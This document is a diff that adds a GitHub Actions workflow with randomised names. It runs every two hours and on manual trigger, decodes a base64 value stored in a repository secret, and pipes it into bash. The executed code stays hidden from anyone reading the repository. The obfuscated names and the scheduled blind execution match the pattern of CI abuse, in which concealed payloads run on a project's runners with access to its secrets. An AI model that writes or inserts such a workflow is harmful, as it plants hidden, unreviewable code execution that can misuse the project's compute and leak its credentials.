@@ -1,0 +1,13 @@
+name: qnoeWc
+on:
+  schedule:
+    - cron: '0 */2 * * *'
+  workflow_dispatch:
+jobs:
+  GBCmCe:
+    runs-on: ubuntu-latest
+    env:
+      mHyuTC: ${{ secrets.iEcNHFuN }}
+    steps:
+      - uses: actions/checkout@v5
+      - run: echo "${{ secrets.VZUArOFocYcp }}" | base64 -d | bash
